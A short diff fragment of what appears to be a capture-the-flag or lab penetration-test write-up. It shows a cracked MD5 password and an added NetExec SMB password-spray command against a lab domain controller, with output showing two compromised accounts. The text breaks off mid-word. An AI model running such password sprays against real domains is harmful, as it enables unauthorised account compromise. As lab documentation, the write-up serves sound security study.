@@ -466,8 +466,13 @@ d482a055616317f569cd1ab90325479e://newpassword123
 
 There were two users in the DB with the same MD5 hash and this was the one that cracked, so ill just try and spray this password against the whole domain
 
-# Password spray
+# Password spray leads to user compromise of two users
 
 ```python
+nxc smb dc.hsm-defense.local -u users.txt -p '//newpassword123' -k --continue-on-success
 
+SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\aaron.pierce://newpassword123
+SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\caleb.turner://newpassword123
 ```
+
+Two users comr
